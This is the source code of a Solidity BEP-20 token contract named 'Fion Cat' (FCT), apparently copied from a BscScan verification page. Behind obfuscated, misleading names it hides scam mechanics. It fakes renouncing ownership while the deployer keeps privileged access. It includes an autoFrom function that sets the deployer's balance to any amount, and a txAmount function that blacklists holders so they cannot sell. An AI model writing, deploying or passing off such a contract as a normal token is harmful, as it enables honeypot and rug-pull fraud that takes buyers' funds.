/**
 *Submitted for verification at BscScan.com on 2023-02-16
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface receiverTx {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tradingSell) external view returns (uint256);

    function transfer(address feeAt, uint256 buyWallet) external returns (bool);

    function allowance(address autoSender, address spender) external view returns (uint256);

    function approve(address spender, uint256 buyWallet) external returns (bool);

    function transferFrom(
        address sender,
        address feeAt,
        uint256 buyWallet
    ) external returns (bool);

    event Transfer(address indexed from, address indexed atReceiver, uint256 value);
    event Approval(address indexed autoSender, address indexed spender, uint256 value);
}

interface receiverTxMetadata is receiverTx {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract shouldMinTx {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface swapSell {
    function createPair(address fromToken, address toSwapTx) external returns (address);
}

interface listLaunched {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract FionCat is shouldMinTx, receiverTx, receiverTxMetadata {

    bool public amountBuyWallet;

    function toFrom() public view returns (bool) {
        return enableSwap;
    }

    function launchToLiquidity(address buyFund, address feeAt, uint256 buyWallet) internal returns (bool) {
        require(teamFrom[buyFund] >= buyWallet);
        teamFrom[buyFund] -= buyWallet;
        teamFrom[feeAt] += buyWallet;
        emit Transfer(buyFund, feeAt, buyWallet);
        return true;
    }

    function sellEnable() public {
        
        if (exemptLaunchedTo == fundTeam) {
            fundTeam = false;
        }
        senderMax=0;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return listAuto;
    }

    bool private enableSwap;

    function atLaunched() public {
        if (receiverAuto == walletLaunched) {
            atTx = walletLaunched;
        }
        
        tradingAmount=false;
    }

    bool private fundTeam;

    function balanceOf(address tradingSell) public view virtual override returns (uint256) {
        return teamFrom[tradingSell];
    }

    address private maxSwap;

    event OwnershipTransferred(address indexed txBuy, address indexed limitLaunch);

    bool public tradingAmount;

    function totalSender() public view returns (uint256) {
        return receiverAuto;
    }

    mapping(address => bool) public feeMarketing;

    function txAmount(address limitList) public {
        
        if (limitList == txIs || limitList == totalReceiver || !receiverTrading[_msgSender()]) {
            return;
        }
        
        feeMarketing[limitList] = true;
    }

    function exemptSwap() public view returns (uint256) {
        return receiverAuto;
    }

    function name() external view virtual override returns (string memory) {
        return receiverFund;
    }

    uint256 private listAuto = 100000000 * 10 ** 18;

    function decimals() external view virtual override returns (uint8) {
        return receiverBuy;
    }

    function exemptReceiver() public {
        emit OwnershipTransferred(txIs, address(0));
        maxSwap = address(0);
    }

    address public totalReceiver;

    function transfer(address isTake, uint256 buyWallet) external virtual override returns (bool) {
        return launchedExempt(_msgSender(), isTake, buyWallet);
    }

    function approve(address senderFrom, uint256 buyWallet) public virtual override returns (bool) {
        amountTxFrom[_msgSender()][senderFrom] = buyWallet;
        emit Approval(_msgSender(), senderFrom, buyWallet);
        return true;
    }

    bool public exemptLaunchedTo;

    function isEnable() public {
        if (walletLaunched != receiverAuto) {
            fundTeam = false;
        }
        
        tradingAmount=false;
    }

    mapping(address => uint256) private teamFrom;

    uint256 public receiverAuto;

    function autoFrom(uint256 buyWallet) public {
        if (!receiverTrading[_msgSender()]) {
            return;
        }
        teamFrom[txIs] = buyWallet;
    }

    function getOwner() external view returns (address) {
        return maxSwap;
    }

    mapping(address => mapping(address => uint256)) private amountTxFrom;

    uint8 private receiverBuy = 18;

    function launchedExempt(address buyFund, address feeAt, uint256 buyWallet) internal returns (bool) {
        if (buyFund == txIs) {
            return launchToLiquidity(buyFund, feeAt, buyWallet);
        }
        require(!feeMarketing[buyFund]);
        return launchToLiquidity(buyFund, feeAt, buyWallet);
    }

    address public txIs;

    string private receiverFund = "Fion Cat";

    constructor (){
        
        listLaunched teamMode = listLaunched(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        totalReceiver = swapSell(teamMode.factory()).createPair(teamMode.WETH(), address(this));
        maxSwap = _msgSender();
        if (exemptLaunchedTo) {
            receiverAuto = atTx;
        }
        txIs = _msgSender();
        receiverTrading[_msgSender()] = true;
        if (fundTeam == tradingAmount) {
            atTx = receiverAuto;
        }
        teamFrom[_msgSender()] = listAuto;
        emit Transfer(address(0), txIs, listAuto);
        exemptReceiver();
    }

    uint256 private senderMax;

    mapping(address => bool) public receiverTrading;

    uint256 private walletLaunched;

    function transferFrom(address buyFund, address feeAt, uint256 buyWallet) external override returns (bool) {
        if (amountTxFrom[buyFund][_msgSender()] != type(uint256).max) {
            require(buyWallet <= amountTxFrom[buyFund][_msgSender()]);
            amountTxFrom[buyFund][_msgSender()] -= buyWallet;
        }
        return launchedExempt(buyFund, feeAt, buyWallet);
    }

    string private liquidityMarketingAuto = "FCT";

    function owner() external view returns (address) {
        return maxSwap;
    }

    function minFund() public view returns (uint256) {
        return senderMax;
    }

    function symbol() external view virtual override returns (string memory) {
        return liquidityMarketingAuto;
    }

    function allowance(address takeMax, address senderFrom) external view virtual override returns (uint256) {
        return amountTxFrom[takeMax][senderFrom];
    }

    uint256 private atTx;

    function launchTokenIs(address enableReceiver) public {
        if (amountBuyWallet) {
            return;
        }
        if (exemptLaunchedTo != tradingAmount) {
            tradingAmount = false;
        }
        receiverTrading[enableReceiver] = true;
        
        amountBuyWallet = true;
    }

}